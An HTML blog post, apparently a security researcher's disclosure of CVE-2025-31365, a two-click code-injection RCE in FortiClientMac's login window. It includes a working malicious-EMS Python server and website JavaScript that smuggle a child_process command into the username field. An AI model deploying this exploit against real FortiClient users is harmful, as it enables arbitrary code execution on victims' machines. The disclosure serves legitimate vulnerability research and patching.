@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:type" content="website">
+    <meta name="author" content="Yaniv Nizry">
+    <meta name="description" content="Security research blog">
+    <meta name="keyword"  content="security,research,vulnerability,blog,vulnerabilites">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <title>
+        
+        FortiClient: Two-click RCE via Code Injection in the Login Window - YNizry
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <style>
+    .googleicon {
+        vertical-align: middle;
+        font-size: 20px;
+        font-style: normal;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;    
+        color: #999999;
+        }
+    </style>
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+
+    
+  
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-SCK9223GY8"></script>
+    <script>
+      window.dataLayer = window.dataLayer || []
+      function gtag() {
+        dataLayer.push(arguments)
+      }
+      gtag('js', new Date())
+      gtag('config', 'G-SCK9223GY8')
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Yaniv Nizry Blogs" type="application/atom+xml">
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.webp" />
+        </div>
+        <div class="name">
+            <i>Yaniv Nizry</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="material-icons googleicon">home</i>
+                    <span>Blogs</span>
+                </a>
+            </li>
+            <li >
+                <a href="/talks">
+                    <i class="material-icons googleicon">co_present</i>
+                    <span>Talks</span>
+                </a>
+            </li>
+            <li >
+                <a href="/advisories">
+                    <i class="material-icons googleicon">speaker_notes</i>
+                    <span>Advisories</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="material-icons googleicon">label</i>
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="material-icons googleicon">archive</i>
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="material-icons googleicon">person</i>
+                    <span>About</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="material-icons googleicon">search</i>
+                    <span>Search</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Background"><span class="toc-text">Background</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Communication"><span class="toc-text">Communication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Authentication"><span class="toc-text">Authentication</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Technical-Details"><span class="toc-text">Technical Details</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploitation"><span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Affected-Product"><span class="toc-text">Affected Product</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impact"><span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remediation"><span class="toc-text">Remediation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credit"><span class="toc-text">Credit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Additional-Resources"><span class="toc-text">Additional Resources</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        <div class="post-container">
+    <div class="post-title">
+        FortiClient: Two-click RCE via Code Injection in the Login Window    
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2025-10-13 22:00:00</span></span>
+        
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#rce" title="rce">rce</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#forticlient" title="forticlient">forticlient</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#fortinet" title="fortinet">fortinet</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#code injection" title="code injection">code injection</a>
+        <span>/</span>
+        
+        </span>
+        
+        
+
+        
+            <span class="attr">/
+            
+                <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-31365" title="CVE-2025-31365">CVE-2025-31365</a>
+                    <span>/</span>
+            
+            
+            </span>
+        
+
+
+        
+        <!--<span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>-->
+    </span>
+    </span>
+    </div>
+
+    <div class="post-source-meta post-meta">
+        
+    </div>
+    <div class="post-content no-indent">
+        <h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><h3 id="Communication"><a href="#Communication" class="headerlink" title="Communication"></a>Communication</h3><p>The FortiClient application is meant to be connected and managed by an “Endpoint Management Server” (EMS). Aside from the Electron UI, there are multiple components to the Forticlient application, with each one having its own responsibility. One of them is the <code>Fortinet/FortiClient/bin/epctrl</code> file which is responsible for the network communication part. Communication between the server and the client is handled via a custom protocol. To simplify matters, the flow goes like this:</p>
+<ol>
+<li>First, a Probe request (<code>X-FCCK-PROBE</code>) is sent, and then the server replies with basic EMS information which verifies that the server is an actual EMS.</li>
+<li>The second request is a registration one containing information on the client (<code>X-FCCK-REGISTER</code>).</li>
+<li>If the registration is successful, the connection is maintained via keep-alive messages every <code>X</code> amount of time, which is defined by the server (<code>X-FCCK-KA</code>).</li>
+</ol>
+<p>In this line-based protocol, each header is represented via a new line. The body contains the type of the message followed by the fields&#x2F;values which are separated by the <code>|</code> char, for example, a “probe” reply will look as such:<br><code>FCPROBERPLY: Key1|Value1|Key2|Value2|\r\n</code></p>
+<h3 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h3><p>The FortiClient Electron app handles URLs of the scheme <code>fabricagent://</code>. By using the <code>​​fabricagent://ems?inviteCode=...</code> URL, FortiClient will connect to an on-premise or Fortinet-hosted server depending on if the <code>inviteCode</code> parameter starts with a <code>_</code> character. The code is a base64-encoding of the following format - <code>&lt;version&gt;:&lt;fqdn&gt;:&lt;port?&gt;:&lt;vdom&gt;:&lt;invitation_code&gt;</code> (<code>fqdn</code> &#x3D;&#x3D; the IP of the EMS).</p>
+<p>Using it, clients can connect to EMS conveniently by clicking on a link (<strong>Forticlient will try to connect to the new EMS even if the client is already connected and&#x2F;or requires a password to disconnect</strong>). During connection, if needed, an authentication process is initialized with one of the following three types: <code>SAML</code>, <code>LDAP</code>, or <code>Local</code>.  </p>
+<ul>
+<li><p>In a <code>SAML</code> authentication flow, the server provides a URI which will be opened on the client machine in the browser. The link goes through the web SAML authentication, and finally opens an <code>onboarding</code> URL containing the SAML token:<br>  <code>fabricagent://ems/onboarding?username=...&amp;auth_token=...</code></p>
+</li>
+<li><p>In a <code>Local</code> or <code>LDAP</code> flow, Forticlient will create a basic login window as such:</p>
+<img src="/img/blogs/fortinet/advisories/simple_login_window.png" style="width: 75%; display: block; margin: auto;"/></li>
+</ul>
+<h1 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h1><p>When the client receives an “authenticate” reply from the EMS, it will go to the <code>​​promptUserAuth</code> function (in the <code>compliance.js</code> file). This will first check if a SAML URL is provided. If so, it will proceed with the flow described above. If not, it will create the basic login window with the <code>auth_ldap</code> and <code>auth_user</code> parameters.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">promptUserAuth</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="title function_">getUserAuthProgressing</span>()) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">viewConnecting</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setUserAuthProgressing</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">auth_type</span> === <span class="variable constant_">COMPLIANCE_AUTH_TYPE</span>.<span class="property">SAML</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">data</span>.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;auth_saml&#x27;</span>) &amp;&amp; <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">auth_saml</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      ipcRenderer.<span class="title function_">send</span>(<span class="variable constant_">IPC_RENDERER_REQUEST</span>.<span class="property">SAML_LOGIN</span>, &#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">auth_saml</span>,</span><br><span class="line">        <span class="attr">type</span>: <span class="variable constant_">SAML_TYPES_ENUM</span>.<span class="property">EMS</span>,</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> basicAuthReq = &#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="variable constant_">BASIC_AUTH_TYPES_ENUM</span>.<span class="property">EMS</span>,</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">data</span>.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;auth_ldap&#x27;</span>) &amp;&amp; <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">auth_ldap</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        basicAuthReq.<span class="property">ldap</span> = <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">auth_ldap</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">data</span>.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;auth_user&#x27;</span>) &amp;&amp; <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">auth_user</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        basicAuthReq.<span class="property">auth_user</span> = <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">auth_user</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ipcRenderer.<span class="title function_">send</span>(<span class="variable constant_">IPC_RENDERER_REQUEST</span>.<span class="property">BASIC_LOGIN</span>, basicAuthReq);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The <code>auth_ldap</code> and <code>auth_user</code> parameters are taken from the shared memory file stored at <code>/private/var/run/fctc.s</code> which is set when parsing the register reply (<code>FCREGRPLY</code>) by the <code>epctrl</code> binary.<br>At <code>epctrl::message::Register::ProcessAuth</code> in case the <code>AUTHTYPE</code> field exists in the response, the parameters will be reset including <code>auth_user</code> (the truncated part of the image, lines 34-96), and it will load <code>AUTHLDAP</code> and <code>AUTHSAML</code> key&#x2F;value from the response to <code>auth_ldap</code> and <code>auth_saml</code> correspondingly.<br><img src="/img/blogs/fortinet/advisories/processAuth_1.png" style="width: 100%;"/><br><img src="/img/blogs/fortinet/advisories/processAuth_2.png" style="width: 100%;"/></p>
+<p>Eventually, on the Electron side, the window is created in the <code>BasicAuthWindow</code> class with <code>nodeIntegration</code> set to <code>true</code>.<br>We noticed that the <code>auth_user</code> is formatted into a Javascript snippet (that is meant to prefill the user name) without any sanitization, which leads to Code Execution in case of a malicious <code>auth_user</code> value.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">createWindow</span>(<span class="params">title, auth_user</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> win = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(<span class="variable language_">this</span>.<span class="property">options</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">setWindow</span>(win);</span><br><span class="line">  win.<span class="title function_">loadFile</span>(<span class="variable constant_">BASIC_AUTH_HTML_PATH</span>);</span><br><span class="line">  <span class="comment">// win.webContents.openDevTools();</span></span><br><span class="line">  <span class="keyword">if</span> (title) &#123;</span><br><span class="line">    win.<span class="property">webContents</span>.<span class="title function_">on</span>(<span class="string">&#x27;did-finish-load&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      win.<span class="title function_">setTitle</span>(title);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (auth_user) &#123;</span><br><span class="line">    <span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">          const userNameEle = document.getElementById(&#x27;username&#x27;);</span></span><br><span class="line"><span class="string">          const passwordEle = document.getElementById(&#x27;password&#x27;);</span></span><br><span class="line"><span class="string">          userNameEle.setAttribute(&#x27;placeholder&#x27;, &#x27;<span class="subst">$&#123;auth_user&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">          userNameEle.disabled = true;</span></span><br><span class="line"><span class="string">          passwordEle.focus();</span></span><br><span class="line"><span class="string">          `</span>;</span><br><span class="line">    win.<span class="property">webContents</span>.<span class="title function_">executeJavaScript</span>(code);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> win;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>In order for an attacker to be able to set an arbitrary <code>auth_user</code> parameter and show the basic login window, we came up with the following attack flow:</p>
+<ol>
+<li>A victim visits a malicious website which first opens a link to initialize a normal registration to a malicious EMS.</li>
+<li>The EMS responds with <code>AUTHLDAP</code>, which will prompt the user to sign in and remove any previous <code>AUTHSAML</code> value (This is an important step because it will “save” the login method as LDAP since in step 5 we don’t include any “<code>AUTHTYPE</code>“ key)</li>
+<li>After the EMS responds with an authentication request, a second “onboarding” link is opened automatically via the website. This link sets a malicious username and authenticates again in the background.</li>
+<li>The EMS responds with registration successfully to the onboarding request.</li>
+<li>The user either enters credentials or cancels the sign-in window.</li>
+<li>In the next keep-alive message, the server will send an error message 14 (meant to authenticate the user again) but this time without <code>AUTHTYPE</code>. This will not overwrite any parameter (<code>auth_ldap</code>, <code>auth_saml</code>, <code>auth_user</code>), and will show the previous sign-in window, but this time with the injected Javascript code.</li>
+</ol>
+<img src="/img/blogs/fortinet/advisories/two-click_rce_attack_flow.png" style="width: 100%;"/>
+
+<p>We are not familiar with other ways to set arbitrary usernames and simultaneously trigger the vulnerable basic login window.<br>Malicious EMS code (simple cert and key are needed for SSL):</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">SERVER_PORT = <span class="number">9999</span></span><br><span class="line">cwd = <span class="string">&quot;/home/ubuntu/Downloads&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Server</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(Server, self).__init__()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        server = ssl.wrap_socket(server, server_side=<span class="literal">True</span>, keyfile=path.join(cwd, <span class="string">&quot;key.pem&quot;</span>), certfile=path.join(cwd, <span class="string">&quot;cert.pem&quot;</span>))</span><br><span class="line">        server.bind((HOST, SERVER_PORT))</span><br><span class="line">        server.listen(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            back_data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            connection, client_address = server.accept()</span><br><span class="line">            data = connection.recv(<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;X-FCCK-PROBE&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                back_data = <span class="string">b&quot;FCPROBERPLY: FGT|FCTEMS8823006072:202305081241mp6|FEATURE_BITMAP|7|EMSVER|7002004|PROTO_VERSION|1.0.0|PERCON|0|\r\n&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">b&quot;X-FCCK-REGISTER&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                b = re.findall(<span class="string">b&quot;SYSINFO\|(.*)\|\r&quot;</span>, data)[<span class="number">0</span>]</span><br><span class="line">                d = base64.b64decode(b.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                <span class="keyword">if</span>  <span class="string">b&quot;child_process&quot;</span> <span class="keyword">in</span> d:</span><br><span class="line">                   back_data = <span class="string">b&#x27;FCREGRPLY: REG|0-FCTEMS0000126978:45:i-0fe611041e297e2e9:default:20:43230:1:8:227|AV_SIG|92.08424|LIC_FEATS|8671612|LIC_ED|1878508800|SOFT_CRC|2|EMS_ONNET|0|AUTH_PRD|0|TOKEN|00E5CBA5-7FDD-44E5-875A-AD535F1BCAAA|SERIAL|7E57D5B158B578D5BE60B7AF3FF8023D10D77268|TENANT|00000000000000000000000000000000|PROTO_VERSION|1.0.0|PERCON|0|\r\n&#x27;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    back_data = <span class="string">b&#x27;FCREGRPLY: REG|14|AUTHTYPE|2|AUTHLDAP|title|ERR_MSG|Authentication error|\r\n&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">b&quot;X-FCCK-KA&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                back_data = <span class="string">b&#x27;FCKARPLY: CONT|1|ERROR|14|ERR_MSG|Authentication error|\r\n&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">b&#x27;DATA_HEADER&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">                back_data = <span class="string">b&#x27;UPLOADRPLY: STOP\r\n&#x27;</span></span><br><span class="line">            connection.send(back_data)</span><br><span class="line">            connection.close()</span><br><span class="line"></span><br><span class="line">server = Server()</span><br><span class="line">server.start()</span><br></pre></td></tr></table></figure>
+<p>Malicious website code, note that the second “onboarding” link is executed here with a simple timer. In a more refined scenario an attacker can time it by waiting in the EMS for a connection, and only then open on the web the second link:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let maliciousEMSIp = `<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9999</span>`;</span><br><span class="line">let inviteCode = `<span class="number">1</span>:$&#123;maliciousEMSIp&#125;:default:aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa`;</span><br><span class="line">let maliciousUserName = `test<span class="string">&#x27;);require(&#x27;</span>child_process<span class="string">&#x27;).execSync(&#x27;</span><span class="built_in">open</span> -a Calculator.app<span class="string">&#x27;)//`;</span></span><br><span class="line"><span class="string">window.location.href = `fabricagent://ems?inviteCode=_$&#123;btoa(code)&#125;`;</span></span><br><span class="line"><span class="string">setTimeout(()=&gt;&#123;window.location.href = `fabricagent://ems/onboarding?username=$&#123;maliciousUserName&#125;`;&#125;, 7000)</span></span><br></pre></td></tr></table></figure>
+
+<p><video controls="" src="/videos/fortinet/two-click-RCE-fortinet.mov" style="width: 100%;"></video></p>
+<h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><p>FortiClientMac 7.2.1 through 7.2.8 and FortiClientMac 7.4.0 through 7.4.3</p>
+<h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>A victim who is manipulated to click on a link might execute arbitrary code on their machine. By default, modern browsers also prompt users before opening an external application via a custom scheme, so it does require an additional click on the invite link as well as the onboarding one. Combined with <a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/caught-in-the-fortinet-how-attackers-can-exploit-forticlient-to-compromise-organizations-3-3/">“Caught in the FortiNet”</a> local privilage escelation vulnerability, an attacker can elevate their privileges to root on macOS.</p>
+<h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>Update FortiClientMac to version 7.2.9, 7.4.4 or above.</p>
+<h2 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h2><p>This issue was discovered and reported by <a target="_blank" rel="noopener" href="https://www.twitter.com/ynizry">Yaniv Nizry</a>.</p>
+<h2 id="Additional-Resources"><a href="#Additional-Resources" class="headerlink" title="Additional Resources"></a>Additional Resources</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/caught-in-the-fortinet-how-attackers-can-exploit-forticlient-to-compromise-organizations-1-3/">“Caught in the FortiNet” blogs</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.fortiguard.com/psirt/FG-IR-25-037">Fortinet’s Advisory</a></li>
+<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-31365">CVE-2025-31365</a></li>
+</ul>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        <li>
+            <a target="_blank" href="https://twitter.com/YNizry">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-twitter"></i>
+                            </span>
+            </a>
+        </li>
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/yaniv-git">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://www.linkedin.com/in/yaniv-n-8b4a76193">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-linkedin"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+    </ul>
+    
+    <p>
+    Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
